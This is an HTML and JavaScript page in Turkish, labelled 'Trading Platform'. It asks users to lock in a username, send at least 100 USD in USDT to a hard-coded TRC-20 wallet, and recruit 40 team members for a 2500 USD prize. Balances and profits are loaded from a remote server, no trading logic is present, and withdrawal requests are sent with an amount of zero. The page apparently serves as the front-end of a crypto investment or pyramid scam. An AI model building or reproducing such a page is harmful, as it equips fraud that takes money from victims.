<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trading Platform</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #0b1426;
            color: #ffffff;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
        }
        h2 { text-align: center; color: #ffffff; margin-bottom: 20px; font-size: 22px; }
        .box {
            background-color: #152238;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 15px;
            border: 1px solid #1c2d4a;
        }
        label { display: block; margin-bottom: 8px; font-size: 14px; color: #a0aec0; }
        input[type="text"], input[type="number"] {
            width: 100%;
            padding: 12px;
            border-radius: 6px;
            border: 1px solid #2d3748;
            background-color: #0b1426;
            color: #fff;
            box-sizing: border-box;
            margin-bottom: 10px;
            font-size: 14px;
        }
        button {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 6px;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
            margin-top: 5px;
            color: white;
        }
        .btn-blue { background-color: #0072ff; }
        .btn-green { background-color: #38ef7d; color: #0b1426; }
        .btn-orange { background-color: #ff5858; }
        .stats { margin-top: 10px; }
        .stat-line { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #1c2d4a; }
        .stat-line:last-child { border-bottom: none; }
        .alert { color: #ff5858; font-size: 12px; display: block; margin-top: 5px; }
    </style>
</head>
<body>

<div class="container">
    <h2>Trading Platform</h2>

    <div class="box">
        <label>👤 Mevcut Kullanıcı Adı:</label>
        <input type="text" id="username" placeholder="Lütfen kullanıcı adınızı kilitleyin">
        <button class="btn-blue" onclick="registerUser()">💾 Kaydet ve Kilitle</button>
    </div>

    <div class="box">
        <label>🏆 Büyük Ödül (40 üye): 2500 ABD doları</label>
        <label>Aktif ekip üyeleriniz: <span id="teamCount" style="color:#38ef7d; font-weight:bold;">0 / 40</span></label>
        <button class="btn-orange" onclick="sendBonusRequest()">📢 Bonusu Yöneticiye Gönder</button>
    </div>

    <div class="box">
        <div class="stats">
            <div class="stat-line">
                <span>💰 Toplam Sermaye:</span>
                <span id="capital" style="font-weight:bold; color:#38ef7d;">USDT 0.00</span>
            </div>
            <div class="stat-line">
                <span>📊 Bugünkü Kâr:</span>
                <span id="todayProfit" style="font-weight:bold; color:#38ef7d;">USDT 0.00</span>
            </div>
            <div class="stat-line">
                <span>🎁 Bilet gelirleri ve davetiye ödülleri:</span>
                <span id="inviteProfit" style="font-weight:bold; color:#38ef7d;">USDT 0.00</span>
            </div>
        </div>
    </div>

    <div class="box">
        <label>🚨 Anında Para Çekme İşlemleri Paneli (TRC-20 Ağı):</label>
        <input type="text" id="withdrawAddress" placeholder="Cüzdan Adresinizi Girin...">
        <button class="btn-orange" style="margin-bottom:8px;" onclick="withdraw('Toplam Sermayeyi Çek')">💸 Toplam Sermayeyi Çek</button>
        <button class="btn-blue" style="margin-bottom:8px;" onclick="withdraw('Bugünkü Kârı Çek')">📊 Bugünkü Kârı Çek</button>
        <button class="btn-blue" onclick="withdraw('Davetiye Ödülünü Çek')">🎁 Davetiye Ödülünü Çek</button>
    </div>

    <div class="box">
        <label>📥 Para Yatırma İsteği (USDT TRC-20):</label>
        <input type="text" id="walletAddress" value="TA1vsgrJEFy3YM6rkQWBppnZemFE6c9pBN" readonly style="text-align:center; color:#38ef7d; font-weight:bold;">
        <button class="btn-blue" style="margin-bottom:12px;" onclick="copyWallet()">📋 Cüzdan Adresini Kopyala</button>
        
        <label>Yatırmak İstediğiniz Miktar:</label>
        <input type="number" id="depositAmount" placeholder="Miktar girin...">
        <span class="alert">⚠ Minimum para yatırma miktarı 100 USD'dir</span>
        <button class="btn-green" style="margin-top:8px;" onclick="sendDeposit()">⚡ Para Yatırma İsteği Gönder</button>
    </div>
</div>

<script>
    const API_BASE_URL = "https://onrender.com";

    async function registerUser() {
        const username = document.getElementById('username').value.trim();
        if(!username) return alert('Lütfen geçerli bir kullanıcı adı girin!');
        try {
            const res = await fetch(`${API_BASE_URL}/api/register-user`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username })
            });
            const data = await res.json();
            if(data.success) {
                alert('Kullanıcı adı başarıyla kilitlendi!');
                localStorage.setItem('savedUsername', username);
                loadUserData(username);
            }
        } catch(err) { alert('Sunucu bağlantı hatası!'); }
    }

    async function loadUserData(username) {
        if(!username) return;
        try {
            const res = await fetch(`${API_BASE_URL}/api/users/${username}`);
            const data = await res.json();
            document.getElementById('capital').innerText = `USDT ${data.capital.toFixed(2)}`;
            document.getElementById('todayProfit').innerText = `USDT ${data.todayProfit.toFixed(2)}`;
            document.getElementById('inviteProfit').innerText = `USDT ${data.inviteProfit.toFixed(2)}`;
            document.getElementById('teamCount').innerText = `${data.teamCount} / 40`;
        } catch(err) { console.error(err); }
    }

    async function withdraw(type) {
        const username = localStorage.getItem('savedUsername');
        const address = document.getElementById('withdrawAddress').value.trim();
        if(!username) return alert('Lütfen önce kullanıcı adınızı kilitleyin!');
        if(!address) return alert('Lütfen cüzdan adresinizi girin!');
        try {
            const res = await fetch(`${API_BASE_URL}/api/orders`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, type, address, amount: 0 })
            });
            const data = await res.json();
            if(data.success) alert('Çekim talebi gönderildi!');
        } catch(err) { alert('İşlem başarısız!'); }
    }

    async function sendDeposit() {
        const username = localStorage.getItem('savedUsername');
        const amount = parseFloat(document.getElementById('depositAmount').value);
        if(!username) return alert('Lütfen önce kullanıcı adınızı kilitleyin!');
        if(isNaN(amount) || amount < 100) return alert('Minimum yatırım miktarı 100 USD\'dir!');
        try {
            const res = await fetch(`${API_BASE_URL}/api/orders`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, type: 'Yatırma', amount, address: 'İsteği Gönderildi' })
            });
            const data = await res.json();
            if(data.success) alert('Para yatırma isteği gönderildi!');
        } catch(err) { alert('İsteğiniz gönderilemedi.'); }
    }

    async function sendBonusRequest() {
        const username = localStorage.getItem('savedUsername');
        if(!username) return alert('Lütfen önce kullanıcı adınızı kilitleyin!');
        try {
            const res = await fetch(`${API_BASE_URL}/api/orders`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, type: 'Referans Bonusunu Çek', amount: 2500, address: 'Bonus İsteği' })
            });
            const data = await res.json();
            if(data.success) alert('Bonus isteği başarıyla gönderildi!');
        } catch(err) { alert('Hata!'); }
    }

    function copyWallet() {
        const copyText = document.getElementById("walletAddress");
        copyText.select();
        navigator.clipboard.writeText(copyText.value);
        alert("Cüzdan adresi kopyalandı: " + copyText.value);
    }

    setInterval(() => {
        const savedUsername = localStorage.getItem('savedUsername');
        if(savedUsername) loadUserData(savedUsername);
    }, 5000);

    window.onload = function() {
        const savedUsername = localStorage.getItem('savedUsername');
        if(savedUsername) {
            document.getElementById('username').value = savedUsername;
            loadUserData(savedUsername);
        }
    }
</script>
</body>
</html>
